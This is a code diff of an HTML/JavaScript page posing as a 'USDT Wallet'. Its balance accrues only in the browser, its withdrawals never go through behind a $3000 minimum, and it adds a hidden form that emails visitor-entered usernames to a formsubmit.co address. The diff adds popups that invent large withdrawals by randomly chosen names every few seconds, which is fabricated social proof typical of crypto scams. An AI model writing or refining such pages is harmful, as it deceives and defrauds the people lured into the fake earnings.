@@ -4,18 +4,18 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>USDT Wallet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
-      padding: 0;
-      height: 100vh;
-      background: linear-gradient(-45deg, #003d2a, #00694b, #00513b, #008b64);
-      background-size: 400% 400%;
-      animation: gradient 20s ease infinite;
       font-family: 'Poppins', sans-serif;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
+      background: linear-gradient(-45deg, #003d2a, #00694b, #00513b, #008b64);
+      background-size: 400% 400%;
+      animation: gradient 20s ease infinite;
       color: white;
     }
 
@@ -27,15 +27,18 @@
 
     .container {
       background: rgba(0, 0, 0, 0.6);
-      padding: 25px;
+      padding: 25px 20px;
       border-radius: 15px;
       width: 300px;
       text-align: center;
+      position: relative;
+      box-shadow: 0 0 20px rgba(0,255,128,0.2);
     }
 
     h2 {
       color: #00e99a;
-      margin-bottom: 15px;
+      font-size: 1.4em;
+      margin-bottom: 10px;
     }
 
     .balance {
@@ -44,20 +47,21 @@
     }
 
     button {
-      padding: 10px;
       width: 100%;
+      padding: 10px;
       border: none;
       border-radius: 8px;
       background-color: #00e99a;
       color: #000;
       font-weight: bold;
       cursor: pointer;
+      margin-top: 10px;
     }
 
     input {
       width: 100%;
       padding: 8px;
-      margin-top: 15px;
+      margin-top: 10px;
       border-radius: 6px;
       border: none;
     }
@@ -67,28 +71,73 @@
       padding: 10px;
       border-radius: 8px;
       font-size: 0.85em;
-      margin-top: 10px;
+      margin-top: 15px;
+      max-height: 100px;
+      overflow-y: auto;
+    }
+
+    .referral-box {
+      font-size: 0.85em;
+      margin-top: 15px;
+      color: #aaffcc;
+      background: rgba(0,255,128,0.1);
+      padding: 8px;
+      border-radius: 6px;
     }
 
     form {
       display: none;
     }
+
+    /* Notification style */
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: rgba(0, 255, 128, 0.15);
+      border: 1px solid rgba(0, 255, 128, 0.3);
+      padding: 10px 16px;
+      font-size: 0.85rem;
+      color: #a8ffce;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 255, 128, 0.2);
+      opacity: 0;
+      pointer-events: none;
+      z-index: 999;
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      transform: translateY(-20px);
+    }
+
+    .notification.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
   </style>
 </head>
 <body>
 
+  <!-- Notification floating -->
+  <div class="notification" id="notification"></div>
+
+  <!-- Wallet Container -->
   <div class="container">
     <h2>USDT Wallet</h2>
     <div class="balance">Balance: <span id="balance">0.00000000</span> USDT</div>
     <button onclick="handleWithdraw()">Withdraw</button>
 
+    <div class="referral-box">
+      Your referral code: <b id="refcode">loading...</b>
+    </div>
+
+    <input type="text" id="refUsedBy" placeholder="Who used your code?" />
+    <button onclick="sendReferral()">Submit</button>
+
     <div class="history" id="withdraw-history">No withdrawals yet.</div>
 
-    <!-- Send referral owner -->
-    <input type="text" id="refOwner" placeholder="Who used your referral?" onblur="sendReferralOwner(this.value)" />
+    <!-- Hidden form -->
     <form id="notifyForm" action="https://formsubmit.co/snipemarkets@gmail.com" method="POST">
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="referrer" id="hiddenRef">
+      <input type="hidden" name="referrer_used" id="hiddenRef">
     </form>
   </div>
 
@@ -97,7 +146,9 @@
     let miningStarted = false;
     const usdtPerMs = 1 / 120000;
 
-    // Add $200 to referral if used
+    const username = localStorage.getItem('usdt_user') || 'user123';
+    document.getElementById('refcode').textContent = username;
+
     const referral = localStorage.getItem('usdt_referral_used');
     const alreadyCredited = localStorage.getItem('usdt_referral_rewarded');
     if (referral && !alreadyCredited) {
@@ -105,6 +156,9 @@
       const refBalance = parseFloat(localStorage.getItem(refKey)) || 0;
       localStorage.setItem(refKey, (refBalance + 200).toString());
       localStorage.setItem('usdt_referral_rewarded', 'yes');
+
+      balance += 200; // $200 bonus to new user
+      localStorage.setItem('usdtBalance', balance.toString());
     }
 
     function startMining() {
@@ -130,19 +184,58 @@
 
     function handleWithdraw() {
       if (balance >= 3000) {
-        alert("Redirect to withdrawal page...");
-        // location.href = "withdraw.html";
+        alert("Redirecting to withdrawal page...");
+        // window.location.href = "withdraw.html";
       } else {
         alert("Minimum withdrawal is $3000 USDT.");
       }
     }
 
-    function sendReferralOwner(name) {
-      if (!name) return;
+    function sendReferral() {
+      const name = document.getElementById("refUsedBy").value.trim();
+      if (!name) {
+        alert("Please enter the username.");
+        return;
+      }
       document.getElementById("hiddenRef").value = name;
       document.getElementById("notifyForm").submit();
+      alert("Submitted anonymously. Thank you.");
+      document.getElementById("refUsedBy").value = "";
     }
 
+    // Random success notification
+    const names = ["Alex", "Ayesha", "Zain", "Emma", "Lucas", "Noah", "Liam", "Sophia", "Amelia", "Olivia", "Ethan", "Ava", "Mia", "Zara", "Yusuf", "Nora"];
+    const notificationEl = document.getElementById("notification");
+    let lastName = null;
+
+    function getRandomAmount() {
+      return (Math.floor(Math.random() * 20) + 5) * 5000;
+    }
+
+    function getRandomName() {
+      let name;
+      do {
+        name = names[Math.floor(Math.random() * names.length)];
+      } while (name === lastName);
+      lastName = name;
+      return name;
+    }
+
+    function showNotification() {
+      const name = getRandomName();
+      const amount = getRandomAmount();
+      const text = `${name} successfully withdrew $${amount.toLocaleString()}`;
+      notificationEl.textContent = text;
+      notificationEl.classList.add("show");
+
+      setTimeout(() => {
+        notificationEl.classList.remove("show");
+      }, 2800);
+    }
+
+    setInterval(showNotification, 3200);
+
+    // Start app
     window.onload = () => {
       updateBalance();
       updateWithdrawHistory();
